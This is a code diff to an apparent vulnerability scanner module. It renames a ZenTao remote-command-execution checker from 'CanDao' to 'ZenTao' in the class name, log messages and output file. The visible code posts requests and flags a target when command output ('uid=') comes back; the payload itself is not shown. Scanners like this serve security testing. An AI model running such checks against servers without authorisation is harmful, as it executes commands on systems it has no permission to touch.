@@ -4,7 +4,7 @@ from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
 from pub.com.reqset import ReqSet
 import requests
 from pub.com.output import OutPutFile
-class CanDao_Rce_Scan:
+class ZenTao_Rce_Scan:
     def __init__(self):
         self.header = None
         self.proxy = None
@@ -28,12 +28,12 @@ class CanDao_Rce_Scan:
             req2 = requests.post(url3, timeout=3,verify=self.verify,proxies=self.proxy,headers=header,data=data)
             req3 = requests.post(url4, timeout=3,verify=self.verify,proxies=self.proxy,headers=header,data=data2)
             if "uid=" in req3.text:
-                OutPrintInfoSuc("CanDao", f"存在禅道项目管理系统远程命令执行漏洞{url}")
+                OutPrintInfoSuc("ZenTao", f"存在禅道项目管理系统远程命令执行漏洞{url}")
                 if self.batch:
-                    OutPutFile("candao_rce.txt",f"存在禅道项目管理系统远程命令执行漏洞{url}")
+                    OutPutFile("zentao_rce.txt",f"存在禅道项目管理系统远程命令执行漏洞{url}")
         except Exception:
             if not self.batch:
-                OutPrintInfo("CanDao", "目标请求出错")
+                OutPrintInfo("ZenTao", "目标请求出错")
 
     def main(self,target):
         self.batch = target["batch_work"]
@@ -44,7 +44,7 @@ class CanDao_Rce_Scan:
         _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)
 
         if not self.batch:
-            OutPrintInfo("CanDao", "开始检测禅道项目管理系统远程命令执行漏洞...")
+            OutPrintInfo("ZenTao", "开始检测禅道项目管理系统远程命令执行漏洞...")
         self.send_payload(url)
         if not self.batch:
-            OutPrintInfo("CanDao", "不存在禅道项目管理系统远程命令执行漏洞")
+            OutPrintInfo("ZenTao", "不存在禅道项目管理系统远程命令执行漏洞")
